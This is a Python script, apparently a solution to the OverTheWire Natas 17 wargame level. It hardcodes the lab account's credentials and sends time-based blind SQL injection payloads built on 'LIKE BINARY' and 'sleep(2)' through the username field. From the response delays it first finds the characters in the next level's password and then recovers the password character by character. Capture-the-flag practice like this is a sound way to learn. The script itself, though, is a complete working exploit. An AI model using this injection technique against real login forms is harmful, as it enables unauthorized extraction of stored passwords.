# Overthewire: Natas 17
# woanmeo11

import requests
from string import ascii_letters, digits


url = 'http://natas17.natas.labs.overthewire.org/'
account = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')

chars = ascii_letters + digits
filtered = ''
password = ''

for c in chars:
    payload = {'username': f'natas18" and password LIKE BINARY "%{c}%" and sleep(2) #'}
    r = requests.post(url, auth=account, data=payload)
    if r.elapsed.seconds >= 2:
        filtered += c
        print(filtered)

for i in range(32):
    for c in filtered:
        payload = {'username': f'natas18" and password LIKE BINARY "{password + c}%" and sleep(2) #'}
        r = requests.post(url, auth=account, data=payload)
        if r.elapsed.seconds >= 2:
            password += c
            print(password)
            break
